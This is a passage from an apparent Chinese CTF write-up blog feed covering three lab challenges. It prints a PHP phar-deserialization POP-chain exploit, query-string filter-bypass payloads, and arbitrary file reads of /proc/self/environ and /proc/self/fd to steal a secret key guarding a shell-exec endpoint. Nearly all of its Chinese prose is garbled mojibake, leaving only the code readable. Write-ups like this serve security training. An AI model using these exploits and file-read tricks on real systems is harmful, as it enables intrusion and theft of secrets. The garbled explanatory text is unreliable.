class="hljs-string">&#x27;/var/www/html/&#x27;</span>); $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>] ? $_GET[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($file)) &#123;     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; &#125; $show = <span class="hljs-keyword">new</span> Show(); <span class="hljs-keyword">if</span>(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($file))&#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); &#125; <span class="hljs-meta">?&gt;</span></code></pre><p>file_existsåˆ¤æ–­fileå‚æ•°çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ•…ä¼ªåè®®ä¸èƒ½ç”¨ã€‚è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶èµ‹å€¼ç»™Showç±»çš„$sourceã€‚è°ƒç”¨_show()ï¼Œè¿™ä¸ªå‡½æ•°åœ¨class.phpä¸­</p><pre><code class="hljs reasonml">public <span class="hljs-keyword">function</span> <span class="hljs-constructor">_show()</span>&#123;    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">file</span>:|<span class="hljs-params">gopher</span>|<span class="hljs-params">dict</span>|\.\.|<span class="hljs-params">f1ag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>) &#123;        die(&#x27;hacker!&#x27;);    &#125; <span class="hljs-keyword">else</span>&#123;            highlight<span class="hljs-constructor">_file($<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>;    &#125;      &#125;</code></pre><p>ä¼ å…¥çš„æ–‡ä»¶åæ­£åˆ™è¿‡æ»¤ï¼Œç»•è¿‡å°±è¯»å–æºç ï¼›æ€»ç»“è¯»å–æµç¨‹ï¼šæ–‡ä»¶å==&gt;file_exists==æ­£åˆ™è¿‡æ»¤==&gt;è¯»å–</p><p>function.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//show_source(__FILE__); </span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); error_reporting(<span class="hljs-number">0</span>); <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     $filename = md5($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;     <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . $filename);     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     <span class="hljs-keyword">if</span>(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-keyword">global</span> $_FILES;     $allowed_types = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);     $temp = explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);     $extension = end($temp);     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($extension)) &#123;         <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span>    &#125;     <span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">if</span>(in_array($extension,$allowed_types)) &#123;             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;         &#125;         <span class="hljs-keyword">else</span> &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;             <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;         &#125;     &#125; &#125; <span class="hljs-meta">?&gt;</span></code></pre><p>è°ƒç”¨upload_fileå‡½æ•°ã€‚ <code>upload_file_check()ï¼šåˆ¤æ–­æ–‡ä»¶åç¼€åï¼Œå¿…é¡»æ˜¯gif/jpeg/jpg/png</code> ==&gt;<code>upload_file_do() ä¸Šä¼ æ–‡ä»¶;æ–‡ä»¶å=md5(æ–‡ä»¶å+IPåœ°å€)</code></p><p>åºåˆ—åŒ–ï¼Œæ— unserialize()ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œpharåè®®æœªè¿‡æ»¤ï¼Œåº”è¯¥è¦pharååºåˆ—åŒ–ã€‚</p><p>class.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;str = $name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;source = $file;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;        <span class="hljs-keyword">return</span> $content;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$key,$value</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;$key = $value;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);        &#125;            &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];        &#125; <span class="hljs-keyword">else</span> &#123;            $value = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span><span class="hljs-function">    </span>&#123;        $text = base64_encode(file_get_contents($value));        <span class="hljs-keyword">return</span> $text;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="POPé“¾æ„é€ "><a class="header-anchor" href="#POPé“¾æ„é€ ">ğŸ­</a>POPé“¾æ„é€ </h4><h5 id="destruct"><a class="header-anchor" href="#destruct">ğŸ­</a>__destruct()</h5><p>__destruct()æ˜¯PHPä¸­çš„ææ„æ–¹æ³•ï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç¨‹åºç»“æŸæ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡ã€‚å‡½æ•°ä¸­å‘ç°äº†echoï¼Œé‚£ä¹ˆè¦åˆ©ç”¨echo $this-&gt;testã€‚(æˆ‘ä¹ æƒ¯ä»destructå…¥æ‰‹)</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;&#125;</code></pre><h5 id="toString"><a class="header-anchor" href="#toString">ğŸ­</a>__toString(),</h5><p>__toStringæ–¹æ³•åœ¨å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚è¿›è¡Œechoï¼Œprintæ“ä½œæ—¶ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åˆ©ç”¨$this-&gt;str[â€˜strâ€™]-&gt;source;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;        <span class="hljs-keyword">return</span> $content;&#125;</code></pre><h5 id="getï¼ˆï¼‰"><a class="header-anchor" href="#getï¼ˆï¼‰">ğŸ­</a>__getï¼ˆï¼‰</h5><p>__getï¼ˆï¼‰å½“æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p><p>åˆ©ç”¨ <code>$this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function"></span>&#123;       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];&#125; <span class="hljs-keyword">else</span> &#123;            $value = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span><span class="hljs-function"></span>&#123;       $text = base64_encode(file_get_contents($value));       <span class="hljs-keyword">return</span> $text;&#125;</code></pre><p>è°ƒç”¨äº†file_get_contentsï¼Œpopé“¾çš„ç»“æŸã€‚</p><p>æ€è·¯ï¼š<code>C1e4r::destruct() --&gt; Show::toString() --&gt; Test::__get() </code></p><p>Cle4r: å°†strèµ‹å€¼ä¸ºShowç±»,<code> this-&gt;test=$this-&gt;Show echo $this-&gt;test;</code> è§¦å‘Showç±»ä¸­çš„<code>__tostring</code>é­”æœ¯æ–¹æ³•</p><p>==&gt;Show: æ‰§è¡Œ <code>$content=$this-&gt;str['str']-&gt;source; </code>å°†str[â€˜strâ€™]èµ‹å€¼ä¸ºTestç±»,ä½¿å…¶è°ƒç”¨sourceã€‚</p><p>==&gt;Test: æ‰§è¡Œ __get($key)ã€‚$keyä¸ºsourceã€‚ <code>get($key) $value=this-&gt;params['source']; file_get_contents($value); </code>paramsæ˜¯æ•°ç»„ï¼Œæ•…å°±å®šä¹‰<code>params=array('source'=&gt;'/var/www/html/fl1g.php');</code></p><p>exp</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;&#125;$c1e4r = <span class="hljs-keyword">new</span> C1e4r();$show = <span class="hljs-keyword">new</span> Show();$test = <span class="hljs-keyword">new</span> Test();$test-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;$c1e4r-&gt;str = $show;   $show-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = $test; $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); $phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//å›ºå®šçš„</span>$phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); $phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>ç”Ÿæˆæ–‡ä»¶åä¸Šä¼ ï¼Œå› ä¸º<code>upload_file_check()</code>çš„é™åˆ¶éœ€è¦æ”¹åç¼€åï¼Œæ–‡ä»¶åä¸ºMD5ï¼ˆæ–‡ä»¶å+IPï¼‰ç®—å‡ºï¼Œåœ¨fileä¸‹è§¦å‘pharå³å¯</p><p><img src="/2021/07/30/black/7.png" alt="7"></p><p>è§£ç è·å¾—flag</p><p>å‚è€ƒï¼š<a href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/</a></p>]]></content>
    
    
    <categories>
      
      <category>Flask-sessionèº«ä»½ä¼ªé€ </category>
      
      <category>pharååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆä¸‰ï¼‰</title>
    <link href="/2021/07/29/session/"/>
    <url>/2021/07/29/session/</url>
    
    <content type="html"><![CDATA[<h1>[MRCTF2020]å¥—å¨ƒ</h1><p>æºç </p><pre><code class="hljs smalltalk"><span class="hljs-string">$q</span>uery = <span class="hljs-string">$_</span>SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; if( substr_count(<span class="hljs-string">$q</span>uery, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-string">$q</span>uery, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);&#125; if(<span class="hljs-string">$_</span>GET[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-string">$_</span>GET[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;    echo <span class="hljs-comment">&quot;you are going to the next ~&quot;</span>;&#125;</code></pre><p><code>$_SERVER['QUERY_STRING']</code>å–å€¼ï¼š</p><p>ä¾‹å¦‚ï¼š <a href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> ==&gt;<code>$_SERVER['QUERY_STRING'] = &quot;p=222&quot;;</code></p><p><code>ä¸Šè¿°ä»£ç ä¸èƒ½å‡ºç°'_'å’Œ'%5f'ï¼Œå¯ä»¥ç”¨â€˜ â€™æˆ–â€˜.â€™æˆ–â€˜ %5Fâ€™ç»•è¿‡</code>,å‚æ•°b_u_p_tæ­£åˆ™åŒ¹é…éœ€è¦åŒ¹é…åˆ°23333æ‰€ä»¥è¿™é‡Œç”¨%0a(æ­£åˆ™åŒ¹é…ä¸­â€™^â€˜å’Œâ€™$'ä»£è¡¨çš„æ˜¯è¡Œçš„å¼€å¤´å’Œç»“å°¾,æ‰€ä»¥èƒ½åˆ©ç”¨æ¢è¡Œç»•è¿‡)ç»•è¿‡ã€‚è¯¦è§ï¼š<a href="https://www.freebuf.com/articles/web/213359.html">åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</a></p><p>payload:<code>?b%5Fu%5Fp%5Ft=23333%0a</code>æˆ–<code>?b.u.p.t=23333%0a</code>,æç¤ºsecrettw.phpï¼Œè®¿é—®å¾—åˆ°jsfuckä»£ç ï¼Œconsoleæ‰§è¡Œï¼Œæç¤ºMerakä¼ å‚ï¼Œä¼ å‚å¾—åˆ°ä»£ç ï¼š</p><p><img src="/2021/07/29/session/1.png" alt="1"></p><blockquote><p>IPåœ°å€ä¸º127.0.0.1 åœ¨headerä¸­åŠ client-ip:127.0.0.1å³å¯</p><p>file_get_contentsç”¨phpä¼ªåè®®ç»•è¿‡ æˆ–dataåè®®ï¼š</p><p><code>2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code></p><p>changeå‡½æ•°å°†ä¼ å…¥çš„å‚æ•°å…ˆè¿›è¡Œbase64è§£ç ï¼Œç„¶åå°†å­—ç¬¦è½¬åŒ–æˆASCIIå¹¶ä¸”+$i*2</p><blockquote><p>åå†™change</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unchange</span>(<span class="hljs-params">$v</span>)</span>&#123;     $re = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> );     &#125;     <span class="hljs-keyword">return</span> $re; &#125;$real_flag = unchange(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-keyword">echo</span> base64_encode($real_flag);<span class="hljs-meta">?&gt;</span>    <span class="hljs-comment">//å¾—åˆ°ZmpdYSZmXGI=</span></code></pre></blockquote></blockquote><p>æŠ“åŒ…ä¼ å‚</p><p><img src="/2021/07/29/session/2.png" alt="2"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/rabbittt/p/13291746.html">https://www.cnblogs.com/rabbittt/p/13291746.html</a></p><h1>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h1><p>æµ‹è¯•å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–å½“å‰è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œ</p><blockquote><p>/proc/self/environ</p><p>/proc/self/cmdline</p></blockquote><p><img src="/2021/07/29/session/3.png" alt="3"></p><h4 id="tips"><a class="header-anchor" href="#tips">ğŸ­</a>tips:</h4><p>Proc æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚Proc æœ‰å¤šä¸ªåŠŸèƒ½ ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒè®¿é—®å†…æ ¸ä¿¡æ¯æˆ–ç”¨äºæ’é”™ï¼Œå› ä¸ºLinux æ˜¯ä»¥æ–‡æœ¬æµçš„å½¢å¼æ¥è®¿é—®è¿›ç¨‹ä¿¡æ¯ï¼ŒLinux å‘½ä»¤( æ¯”å¦‚ ps ã€toPpstree ç­‰) éƒ½éœ€è¦ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œæ‰€ä»¥æ­¤ç›®å½•ä¸‹æœ‰è®¸å¤šä¿¡æ¯å¯è®¿é—®ã€‚åœ¨/proc æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æ–‡ä»¶  ã€‚</p><p><strong>è¿›ç¨‹ä¿¡æ¯</strong>ï¼š</p><p>/proc/pid/cmdline åŒ…å«äº†ç”¨äºå¼€å§‹è¿›ç¨‹çš„å‘½ä»¤ ï¼›</p><p>/proc/pid/cwd åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥ ï¼›</p><p>/proc/pid/environ åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨ ï¼›</p><p>/proc/pid/exe åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥ï¼›</p><p>/proc/pid/fd/ è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›</p><p>/proc/pid/mem åŒ…å«äº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›</p><p>/proc/pid/stat åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼›</p><p>/proc/pid/statm åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯ã€‚</p><p>è¿˜æœ‰ç³»ç»Ÿä¿¡æ¯ï¼ˆCPU è´Ÿè½½ã€æ–‡ä»¶ç³»ç»Ÿå’Œç½‘ç»œé…ç½®ï¼‰ï¼Œå†…æ ¸ä¿¡æ¯ç­‰è¯¦è§ï¼š<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">linux proc/pid/ä¿¡æ¯è¯´æ˜</a></p><p><code>/proc/self/cwd/app.py</code>è¯»æºç ï¼š</p><pre><code class="hljs vim">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(SECRET_FILE)SECRET_KEY = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip()os.<span class="hljs-built_in">remove</span>(SECRET_FILE)@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def <span class="hljs-built_in">index</span>():    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/page&#x27;</span>)def page():    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> not url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):            <span class="hljs-keyword">res</span> = urllib.urlopen(url)            value = <span class="hljs-keyword">res</span>.<span class="hljs-keyword">read</span>()            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span>            <span class="hljs-keyword">return</span> response        <span class="hljs-keyword">else</span>:            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span>    excep<span class="hljs-variable">t:</span>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, <span class="hljs-keyword">res</span>=value)@app.route(<span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span>)def manager():    key = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;key&quot;</span>)    <span class="hljs-keyword">print</span>(SECRET_KEY)    <span class="hljs-keyword">if</span> key == SECRET_KEY:        <span class="hljs-keyword">shell</span> = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;shell&quot;</span>)        os.<span class="hljs-built_in">system</span>(<span class="hljs-keyword">shell</span>)        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;ok&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;Wrong Key!&quot;</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre><p><code>no_one_know_the_manager</code>ä¸­è¦åŒ¹é…SECRET_KEYï¼Œç„¶åæ‰§è¡Œshellï¼Œä½†æ˜¯SECRET_KEYæ‰€åœ¨çš„secret.txtè¢«åˆ æ‰äº†<br>æ­¤å¤„å¯ä»¥é€šè¿‡<code>/proc/self/fd/3</code>è¯»å–ï¼ˆ3æ˜¯bpçˆ†ç ´å‡ºæ¥çš„ï¼‰</p><p><img src="/2021/07/29/session/4.png" alt="4"></p><h4 id="tipsï¼š"><a class="header-anchor" 